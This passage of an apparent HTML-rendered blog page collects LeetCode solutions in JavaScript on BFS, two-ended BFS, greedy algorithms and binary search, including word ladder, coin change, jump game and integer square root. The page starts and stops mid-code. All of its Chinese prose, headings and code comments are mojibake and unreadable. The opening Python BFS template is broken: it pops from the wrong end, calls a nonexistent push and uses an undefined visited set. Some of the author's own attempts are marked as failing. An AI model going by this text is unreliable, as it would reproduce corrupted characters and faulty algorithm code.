python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bfs</span>(<span class="params">graph, start,end</span>):</span></span><br><span class="line">  queue = []</span><br><span class="line">  queue.append([start])</span><br><span class="line">  visited.add(start)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> queue:</span><br><span class="line">    node = queue.pop()</span><br><span class="line">    visited.add(node)</span><br><span class="line">    </span><br><span class="line">    process(node)</span><br><span class="line">    nodes=generate_related_nodes(node)</span><br><span class="line">    queue.push(nodes)</span><br></pre></td></tr></table></figure><h2 id="LeetCode200â€”â€”å²›å±¿æ•°é‡ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode200â€”â€”å²›å±¿æ•°é‡ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode200â€”â€”å²›å±¿æ•°é‡ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode200â€”â€”å²›å±¿æ•°é‡ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/number-of-islands/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯-amp-é¢˜è§£-2"><a href="#æ€è·¯-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>æ²‰å²›æ€æƒ³ï¼šé‡åˆ°å²›å±¿æ—¶ï¼Œå²›å±¿æ•°é‡+1ï¼› ä¸”å°†ç›¸é‚»æ‰€æœ‰é™†åœ°å˜ä¸º0ï¼Œç›´è‡³éå†å®Œæ•´ä¸ªç½‘æ ¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> numIslands = <span class="function"><span class="keyword">function</span>(<span class="params">grid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> islands = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> dfs = <span class="function"><span class="keyword">function</span> (<span class="params">i, j</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= grid.length || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].length || grid[i][j] === <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[i][j] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        dfs(i + <span class="number">1</span>, j);</span><br><span class="line">        dfs(i, j + <span class="number">1</span>);</span><br><span class="line">        dfs(i - <span class="number">1</span>, j);</span><br><span class="line">        dfs(i, j - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; grid.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; grid[i].length; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (grid[i][j] === <span class="string">&#x27;0&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">            dfs(i, j);</span><br><span class="line">            islands++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> islands;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Two-ended-BFS"><a href="#Two-ended-BFS" class="headerlink" title="Two-ended BFS"></a>Two-ended BFS</h1><h2 id="LeetCode127â€”â€”å•è¯æ¥é¾™ï¼ˆâ˜†â˜†â˜†ï¼‰"><a href="#LeetCode127â€”â€”å•è¯æ¥é¾™ï¼ˆâ˜†â˜†â˜†ï¼‰" class="headerlink" title="LeetCode127â€”â€”å•è¯æ¥é¾™ï¼ˆâ˜†â˜†â˜†ï¼‰"></a>LeetCode127â€”â€”å•è¯æ¥é¾™ï¼ˆâ˜†â˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/word-ladder/">è·³è½¬åœ°å€</a></p><p>ï¼ˆå…¶å®æŒºå¥½æƒ³çš„ï¼Œä¸ºä»€ä¹ˆæœ€å¼€å§‹å†™çš„æ—¶å€™æƒ³ä¸å‡ºå‘¢ï¼‰</p><h3 id="æ€è·¯1-amp-é¢˜è§£-1"><a href="#æ€è·¯1-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>BFSä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ladderLength = <span class="function"><span class="keyword">function</span>(<span class="params">beginWord, endWord, wordList</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// æ¢æˆå“ˆå¸Œè¡¨ï¼Œæ›´å¿«æ·çš„æŸ¥æ‰¾å•è¯æ˜¯å¦å­˜åœ¨ã€‚Listâ€”â€”O(n);HashSetâ€”â€”O(1)</span></span><br><span class="line">  <span class="keyword">let</span> wordSet = <span class="keyword">new</span> <span class="built_in">Set</span>(wordList);</span><br><span class="line">  <span class="keyword">let</span> queue = [];</span><br><span class="line">  queue.push([beginWord, <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">    <span class="keyword">let</span> [word, level] = queue.shift();</span><br><span class="line">    <span class="keyword">if</span> (word === endWord) &#123;</span><br><span class="line">      <span class="keyword">return</span> level;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; word.length; i++)&#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> c = <span class="number">97</span>; c &lt;= <span class="number">122</span>; c++)&#123;</span><br><span class="line">        <span class="keyword">let</span> newWord = word.slice(<span class="number">0</span>, i) + <span class="built_in">String</span>.fromCharCode(c) + word.slice(i + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (wordSet.has(newWord)) &#123;</span><br><span class="line">          queue.push([newWord, level + <span class="number">1</span>]);</span><br><span class="line">          <span class="comment">// é¿å…è¯¥è¯é‡å¤å…¥åˆ—</span></span><br><span class="line">          wordSet.delete(newWord);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-1"><a href="#æ€è·¯2-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>åŒç«¯BFS</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ladderLength = <span class="function"><span class="keyword">function</span>(<span class="params">beginWord, endWord, wordList</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> wordListSet = <span class="keyword">new</span> <span class="built_in">Set</span>(wordList);</span><br><span class="line">  <span class="keyword">if</span>(!wordListSet.has(endWord))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> beginSet = <span class="keyword">new</span> <span class="built_in">Set</span>(), endSet = <span class="keyword">new</span> <span class="built_in">Set</span>(), level=<span class="number">1</span>;</span><br><span class="line">  beginSet.add(beginWord);</span><br><span class="line">  endSet.add(endWord);</span><br><span class="line">  <span class="comment">// BFS starts here</span></span><br><span class="line">  <span class="keyword">while</span> (beginSet.size) &#123;</span><br><span class="line">    <span class="comment">// new_beginSet å­˜æ”¾æ‰©æ•£å‡ºæ¥çš„ç‚¹</span></span><br><span class="line">    <span class="keyword">let</span> new_beginSet = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> word <span class="keyword">of</span> beginSet) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; word.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> c = <span class="number">97</span>; c &lt;= <span class="number">122</span>; c++)&#123;</span><br><span class="line">          <span class="keyword">let</span> newWord = word.slice(<span class="number">0</span>, i) + <span class="built_in">String</span>.fromCharCode(c) + word.slice(i + <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> (endSet.has(newWord)) &#123;</span><br><span class="line">            <span class="keyword">return</span> level + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (wordListSet.has(newWord)) &#123;</span><br><span class="line">            new_beginSet.add(newWord);</span><br><span class="line">            wordListSet.delete(newWord);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    beginSet = new_beginSet;</span><br><span class="line">    level++;</span><br><span class="line">    <span class="comment">// ä¿è¯ beginSet æ˜¯æœ€å°çš„ï¼Œå¯¹æœ€å°çš„è¿›è¡Œæ‰©æ•£</span></span><br><span class="line">    <span class="keyword">if</span> (beginSet.size &gt; endSet.size) &#123;</span><br><span class="line">      [beginSet, endSet] = [endSet, beginSet];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="è´ªå¿ƒç®—æ³•"><a href="#è´ªå¿ƒç®—æ³•" class="headerlink" title="è´ªå¿ƒç®—æ³•"></a>è´ªå¿ƒç®—æ³•</h1><p>è´ªå¿ƒç®—æ³•æ˜¯ä¸€ç§åœ¨æ¯ä¸€æ­¥é€‰æ‹©ä¸­éƒ½é‡‡å–åœ¨å½“å‰çŠ¶æ€ä¸‹æœ€å¥½æˆ–æœ€ä¼˜ï¼ˆå³æœ€æœ‰åˆ©ï¼‰çš„é€‰æ‹©ï¼Œä»è€Œå¸Œæœ›å¯¼è‡´ç»“æœæ˜¯å…¨å±€æœ€å¥½æˆ–æœ€ä¼˜çš„ç®—æ³•ã€‚</p><p>è´ªå¿ƒç®—æ³•ä¸åŠ¨æ€è§„åˆ’çš„ä¸åŒåœ¨äºå®ƒå¯¹æ¯ä¸ªå­é—®é¢˜çš„è§£å†³æ–¹æ¡ˆéƒ½åšå‡ºé€‰æ‹©ï¼Œä¸èƒ½å›é€€ã€‚åŠ¨æ€è§„åˆ’åˆ™ä¼šä¿å­˜ä»¥å‰çš„è¿ç®—ç»“æœï¼Œå¹¶æ ¹æ®ä»¥å‰çš„ç»“æœå¯¹å½“å‰è¿›è¡Œé€‰æ‹©ï¼Œæœ‰å›é€€åŠŸèƒ½ã€‚</p><p>è´ªå¿ƒæ³•å¯ä»¥è§£å†³ä¸€äº›æœ€ä¼˜åŒ–é—®é¢˜ï¼Œ å¦‚ï¼šæ±‚å›¾ä¸­çš„æœ€å°ç”Ÿæˆæ ‘ã€æ±‚å“ˆå¤«æ›¼ç¼–ç ç­‰ã€‚ç„¶è€Œå¯¹äºå·¥ç¨‹å’Œç”Ÿæ´»ä¸­çš„é—®é¢˜ï¼Œè´ªå¿ƒæ³•ä¸€èˆ¬ä¸èƒ½å¾—åˆ°æˆ‘ä»¬æ‰€è¦æ±‚çš„ç­”æ¡ˆã€‚</p><h2 id="LeetCode322â€”â€”é›¶é’±å…‘æ¢ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode322â€”â€”é›¶é’±å…‘æ¢ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode322â€”â€”é›¶é’±å…‘æ¢ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode322â€”â€”é›¶é’±å…‘æ¢ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/coin-change/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -5"><a href="#è‡ªå·±çš„ä»£ç -5" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> coinChange = <span class="function"><span class="keyword">function</span>(<span class="params">coins, amount</span>) </span>&#123;</span><br><span class="line">    coins = coins.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> b - a);</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">parseInt</span>(amount / coins[<span class="number">0</span>]) !== <span class="number">0</span>) &#123;</span><br><span class="line">            amount = amount - coins[<span class="number">0</span>];</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        coins.shift();</span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼åˆ¤æ–­coinsæ˜¯å¦ä¸º[]æ—¶ï¼Œä¸èƒ½ç”¨ === ï¼Œä¹Ÿä¸èƒ½ï¼ï¼Œå› ä¸ºæ•°ç»„æ˜¯å¯¹è±¡ã€‚</span></span><br><span class="line">        <span class="keyword">if</span> (coins.length === <span class="number">0</span> &amp;&amp; amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœªACï¼Œæ„Ÿè§‰æ€è·¯å°±æ˜¯è¿™æ ·ï¼Œæ²¡ä»€ä¹ˆé—®é¢˜ã€‚ä½†æ˜¯å‡ ä¸ªæé™æµ‹è¯•ç‚¹æ²¡æœ‰è¿‡ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-2"><a href="#æ€è·¯1-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>DFS+è´ªå¿ƒ:ï¼ˆæš‚æ—¶æ²¡çœ‹æ‡‚ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> coinChange = <span class="function">(<span class="params">coins, amount</span>) =&gt;</span> &#123;</span><br><span class="line">    coins.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> b - a);</span><br><span class="line">    <span class="keyword">let</span> res = <span class="literal">Infinity</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> find = <span class="function">(<span class="params">k, amount, count</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> coin = coins[k];</span><br><span class="line">      <span class="keyword">if</span> (k === coins.length - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (amount % coin === <span class="number">0</span>) &#123;</span><br><span class="line">          res = <span class="built_in">Math</span>.min(res, count + ~~(amount / coin));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = ~~(amount / coin); i &gt;= <span class="number">0</span> &amp;&amp; count + i &lt; res; i--) &#123; </span><br><span class="line">          find(k + <span class="number">1</span>, amount - coin * i, count + i);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  </span><br><span class="line">    find(<span class="number">0</span>, amount, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res === <span class="literal">Infinity</span> ? -<span class="number">1</span> : res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-2"><a href="#æ€è·¯2-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>DPï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> coinChange = <span class="function"><span class="keyword">function</span>(<span class="params">coins, amount</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(amount + <span class="number">1</span>).fill(<span class="literal">Infinity</span>);</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= amount; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> coin <span class="keyword">of</span> coins) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i - coin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                dp[i] = <span class="built_in">Math</span>.min(dp[i], dp[i - coin] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[amount] === <span class="literal">Infinity</span> ? -<span class="number">1</span> : dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode55â€”â€”è·³è·ƒæ¸¸æˆï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode55â€”â€”è·³è·ƒæ¸¸æˆï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode55â€”â€”è·³è·ƒæ¸¸æˆï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode55â€”â€”è·³è·ƒæ¸¸æˆï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/jump-game/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -6"><a href="#è‡ªå·±çš„ä»£ç -6" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> canJump = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> length = nums.length;</span><br><span class="line">    <span class="keyword">if</span> (length === <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(length).fill(<span class="literal">false</span>);</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] === <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt;= nums[i]; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; length) &#123;</span><br><span class="line">                arr[i + j] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!arr[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœªACï¼Œæ°¸è¿œå­˜åœ¨å°é”™è¯¯ï¼Œå¤´éƒ½å¤§äº†ã€‚æ€è·¯æ˜¯å°†æ•°ç»„å˜æˆ true / false ï¼Œå¦‚æœæ•°ç»„ä¸­å­˜åœ¨ false åˆ™è¿”å› falseã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-3"><a href="#æ€è·¯1-amp-é¢˜è§£-3" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>è´ªå¿ƒç®—æ³•ï¼Œä»åå¾€å‰è´ªã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> canJump = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!nums) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> endReachable = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = nums.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] + i &gt;= endReachable) &#123;</span><br><span class="line">            endReachable = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> endReachable === <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// å†™æ³•2</span></span><br><span class="line"><span class="keyword">var</span> canJump = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> max = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;nums.length;i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (max &lt; i) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        max = <span class="built_in">Math</span>.max(i+nums[i], max);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode45â€”â€”è·³è·ƒæ¸¸æˆIIï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode45â€”â€”è·³è·ƒæ¸¸æˆIIï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode45â€”â€”è·³è·ƒæ¸¸æˆIIï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode45â€”â€”è·³è·ƒæ¸¸æˆIIï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/jump-game-ii/">è·³è½¬åœ°å€</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jump = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> end = <span class="number">0</span>; <span class="comment">// å½“å‰è·³è·ƒæ‰€èƒ½åˆ°è¾¾çš„è¾¹ç•Œ</span></span><br><span class="line">    <span class="keyword">let</span> steps = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">let</span> max = <span class="number">0</span>; <span class="comment">// å½“å‰è·³è·ƒæ‰€æœ‰ä½ç½®å¯è¾¾çš„æœ€å¤§è·ç¦»</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length - <span class="number">1</span>; i++) &#123; <span class="comment">// æœ€åä¸€ä¸ªä½ç½®ä¸éœ€è¦éå†ï¼Œå› ä¸ºåœ¨æ­¤ä¹‹å‰maxè‚¯å®šå¤§äºç­‰äºè¯¥ä½ç½®çš„ç´¢å¼•</span></span><br><span class="line">        max = <span class="built_in">Math</span>.max(max, i + nums[i]); <span class="comment">// æ›´æ–°å½“å‰è·³è·ƒä¸­iä½ç½®å¯è¾¾çš„æœ€å¤§è·ç¦»</span></span><br><span class="line">        <span class="keyword">if</span> (i === end) &#123; <span class="comment">// å·²ç»åˆ°è¾¾è¾¹ç•Œï¼Œå¿…é¡»è·³ä¸€ä¸‹</span></span><br><span class="line">            end = max; <span class="comment">// æ›´æ–°æ–°çš„è¾¹ç•Œ</span></span><br><span class="line">            steps++; <span class="comment">// å¿…é¡»è·³ä¸€ä¸‹</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> steps;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="äºŒåˆ†æŸ¥æ‰¾"><a href="#äºŒåˆ†æŸ¥æ‰¾" class="headerlink" title="äºŒåˆ†æŸ¥æ‰¾"></a>äºŒåˆ†æŸ¥æ‰¾</h1><p><strong>äºŒåˆ†æŸ¥æ‰¾çš„å‰æï¼š</strong></p><ul><li>ç›®æ ‡å‡½æ•°å•è°ƒæ€§( å•è°ƒé€’å¢æˆ–è€…é€’å‡)</li><li>å­˜åœ¨ä¸Šä¸‹ç•Œ</li><li>èƒ½å¤Ÿé€šè¿‡ç´¢å¼•è®¿é—®</li></ul><h2 id="LeetCode69â€”â€”x-çš„å¹³æ–¹æ ¹ï¼ˆâ˜†ï¼‰"><a href="#LeetCode69â€”â€”x-çš„å¹³æ–¹æ ¹ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode69â€”â€”x çš„å¹³æ–¹æ ¹ï¼ˆâ˜†ï¼‰"></a>LeetCode69â€”â€”x çš„å¹³æ–¹æ ¹ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/sqrtx/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -7"><a href="#è‡ªå·±çš„ä»£ç -7" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mySqrt = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x === <span class="number">0</span> || x === <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; x; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i * i &gt;= x) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i * i &gt; x)&#123;</span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ACï¼Œä½†æ²¡æœ‰æƒ³åˆ°äºŒåˆ†ï¼Œè¿™æ˜¯Oï¼ˆnï¼‰çš„å¤æ‚åº¦ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-4"><a href="#æ€è·¯1-amp-é¢˜è§£-4" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>äºŒåˆ†ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mySqrt = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x === <span class="number">0</span> || x === <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">1</span>, right = x;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="keyword">let</span> mid = left + <span class="built_in">parseInt</span>((right - left) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (mid * mid &gt; x) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-3"><a href="#æ€è·¯2-amp-é¢˜è§£-3" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>ç‰›é¡¿è¿­ä»£æ³•ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mySqrt = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    r = x;</span><br><span class="line">    <span class="keyword">while</span> (r * r &gt; x) &#123;</span><br><span class="line">        r = ((r + x / r) / <span class="number">2</span>) | <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode33â€”â€”æœç´¢æ—‹è½¬æ’åºæ•°ç»„ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode33â€”â€”æœç´¢æ—‹è½¬æ’åºæ•°ç»„ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode33â€”â€”æœç´¢æ—‹è½¬æ’åºæ•°ç»„ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode33â€”â€”æœç´¢æ—‹è½¬æ’åºæ•°ç»„ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -8"><a href="#è‡ªå·±çš„ä»£ç -8" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> search = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>, right = nums.length;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">let</span> mid = <span class="built_in">parseInt</span>((left + right) / <span class="number">2</span>);</span><br><span class="line">        <span class="comment">// å·¦è¾¹å‡åº</span></span><br><span class="line">        <span class="keyword">if</span> (nums[<span class="number">0</span>] &lt;= nums[mid] &amp;&amp; (target &gt; nums[mid] || target &lt; 